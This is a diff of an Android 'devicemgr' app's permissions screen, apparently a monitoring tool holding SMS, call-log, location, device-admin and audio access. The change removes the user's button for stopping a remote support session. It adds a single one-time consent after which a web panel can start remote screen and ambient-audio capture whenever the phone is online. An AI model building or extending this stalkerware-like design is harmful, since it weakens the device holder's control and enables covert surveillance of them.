@@ -18,21 +18,19 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import com.company.devicemgr.receivers.DeviceAdminReceiver;
-import com.company.devicemgr.services.ForegroundTelemetryService;
 import com.company.devicemgr.utils.DeviceIdentity;
 import com.company.devicemgr.utils.AppRuntime;
-
-import org.json.JSONObject;
 
 import java.util.ArrayList;
 import java.util.List;
 
 public class MainPermissionsActivity extends Activity {
-    Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm, btnNotifAccess, btnUsageAccess, btnStartService, btnPickMedia, btnStopSupportSession;
-    TextView tvStatus, tvDeviceId, tvSupportSessionStatus;
+    Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm, btnNotifAccess, btnUsageAccess, btnGrantSupportConsent, btnStartService, btnPickMedia;
+    TextView tvStatus, tvDeviceId, tvSupportConsentStatus, tvRemoteSupportState;
     private static final int REQ_CODE_DEVICE_ADMIN = 1001;
     private static final int REQ_CODE_PERMS = 2001;
     private static final int REQ_PICK_MEDIA = 3001;
+    private static final String SUPPORT_CONSENT_VERSION = "support-session-v2";
     private static final int ANDROID_13_API_LEVEL = 33;
     private static final String READ_MEDIA_IMAGES_PERMISSION = "android.permission.READ_MEDIA_IMAGES";
     private static final String READ_MEDIA_VIDEO_PERMISSION = "android.permission.READ_MEDIA_VIDEO";
@@ -50,13 +48,14 @@ public class MainPermissionsActivity extends Activity {
         btnSmsPerm = findViewById(com.company.devicemgr.R.id.btnSmsPerm);
         btnNotifAccess = findViewById(com.company.devicemgr.R.id.btnNotifAccess);
         btnUsageAccess = findViewById(com.company.devicemgr.R.id.btnUsageAccess);
+        btnGrantSupportConsent = findViewById(com.company.devicemgr.R.id.btnGrantSupportConsent);
         btnStartService = findViewById(com.company.devicemgr.R.id.btnStartService);
         btnPickMedia = findViewById(com.company.devicemgr.R.id.btnPickMedia);
-        btnStopSupportSession = findViewById(com.company.devicemgr.R.id.btnStopSupportSession);
 
         tvStatus = findViewById(com.company.devicemgr.R.id.tvStatus);
         tvDeviceId = findViewById(com.company.devicemgr.R.id.tvDeviceId);
-        tvSupportSessionStatus = findViewById(com.company.devicemgr.R.id.tvSupportSessionStatus);
+        tvSupportConsentStatus = findViewById(com.company.devicemgr.R.id.tvSupportConsentStatus);
+        tvRemoteSupportState = findViewById(com.company.devicemgr.R.id.tvRemoteSupportState);
 
         final android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
         String deviceId = sp.getString("deviceId", null);
@@ -101,6 +100,13 @@ public class MainPermissionsActivity extends Activity {
 
         btnUsageAccess.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)));
 
+        btnGrantSupportConsent.setOnClickListener(v -> new AlertDialog.Builder(MainPermissionsActivity.this)
+                .setTitle("Consentimento remoto")
+                .setMessage("Autoriza uma única vez o uso remoto de ecrã e áudio neste dispositivo? Depois disso, o painel web poderá iniciar ou parar sessões enquanto o telemóvel estiver online.")
+                .setPositiveButton("Autorizar", (d, which) -> grantRemoteSupportConsent())
+                .setNegativeButton("Cancelar", null)
+                .show());
+
         btnStartService.setOnClickListener(v -> {
             boolean active = sp.getBoolean("active", false);
             if (!active) {
@@ -123,12 +129,6 @@ public class MainPermissionsActivity extends Activity {
             startActivityForResult(i, REQ_PICK_MEDIA);
         });
 
-        btnStopSupportSession.setOnClickListener(v -> {
-            AppRuntime.requestSupportSessionStop(this);
-            showMsg("Pedido de paragem enviado");
-            updateSupportSessionStatus();
-        });
-
         updateStatusText();
     }
 
@@ -149,6 +149,12 @@ public class MainPermissionsActivity extends Activity {
     }
 
     private void startTelemetryService() {
+        android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+        if (!sp.getBoolean("support_consent_granted", false)) {
+            showMsg("Conceda primeiro o consentimento remoto de ecrã/áudio");
+            return;
+        }
+
         requestNotificationPermissionIfNeeded();
         AppRuntime.ensureTelemetryStarted(this);
         showMsg("Serviço iniciado");
@@ -173,28 +179,60 @@ public class MainPermissionsActivity extends Activity {
         String deviceId = sp.getString("deviceId", null);
         tvStatus.setText("Token: " + (token != null ? "OK" : "missing"));
         tvDeviceId.setText("DeviceId: " + deviceId);
-        updateSupportSessionStatus();
+        updateSupportConsentStatus();
+        updateRemoteSupportState();
     }
 
-    private void updateSupportSessionStatus() {
+    private void updateSupportConsentStatus() {
         android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
-        String raw = sp.getString("active_support_session_json", null);
-        if (raw == null || raw.trim().isEmpty()) {
-            tvSupportSessionStatus.setText("Sessão de suporte: nenhuma");
-            btnStopSupportSession.setEnabled(false);
+        boolean granted = sp.getBoolean("support_consent_granted", false);
+        String version = sp.getString("support_consent_version", null);
+        tvSupportConsentStatus.setText(granted
+                ? "Consentimento remoto: autorizado" + (version != null ? " (" + version + ")" : "")
+                : "Consentimento remoto: pendente");
+        btnGrantSupportConsent.setEnabled(!granted);
+    }
+
+    private void updateRemoteSupportState() {
+        android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+        String sessionId = sp.getString("remote_support_active_session_id", null);
+        String requestType = sp.getString("remote_support_active_type", null);
+        long lastSyncAt = sp.getLong("remote_support_last_sync_at", 0L);
+
+        if (sessionId == null || sessionId.trim().isEmpty()) {
+            tvRemoteSupportState.setText(lastSyncAt > 0
+                    ? "Sessão remota: inativa (última sincronização: " + new java.util.Date(lastSyncAt) + ")"
+                    : "Sessão remota: inativa");
             return;
         }
 
-        try {
-            JSONObject session = new JSONObject(raw);
-            String requestType = session.optString("requestType", "screen");
-            String expiresAt = session.optString("sessionExpiresAt", "-");
-            tvSupportSessionStatus.setText("Sessão de suporte: " + ("ambient_audio".equals(requestType) ? "áudio" : "ecrã") + " até " + expiresAt);
-            btnStopSupportSession.setEnabled(true);
-        } catch (Exception e) {
-            tvSupportSessionStatus.setText("Sessão de suporte: estado indisponível");
-            btnStopSupportSession.setEnabled(false);
-        }
+        String friendlyType = "ambient_audio".equals(requestType) ? "áudio" : "ecrã";
+        tvRemoteSupportState.setText("Sessão remota: " + friendlyType + " ativa (id: " + sessionId + ")");
+    }
+
+    private void grantRemoteSupportConsent() {
+        requestPermissionsIfNeeded(new String[]{Manifest.permission.RECORD_AUDIO});
+        new Thread(() -> {
+            try {
+                org.json.JSONObject body = new org.json.JSONObject();
+                body.put("accepted", true);
+                body.put("consentTextVersion", SUPPORT_CONSENT_VERSION);
+                String deviceId = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).getString("deviceId", "unknown");
+                String token = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).getString("auth_token", null);
+                String url = com.company.devicemgr.utils.ApiConfig.api("/api/devices/" + deviceId + "/support-consent");
+                com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token);
+                getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit()
+                        .putBoolean("support_consent_granted", true)
+                        .putString("support_consent_version", SUPPORT_CONSENT_VERSION)
+                        .apply();
+                runOnUiThread(() -> {
+                    showMsg("Consentimento remoto guardado");
+                    updateStatusText();
+                });
+            } catch (Exception e) {
+                runOnUiThread(() -> showMsg("Erro ao guardar consentimento: " + e.getMessage()));
+            }
+        }).start();
     }
 
     private void requestPermissionsIfNeeded(String[] perms) {
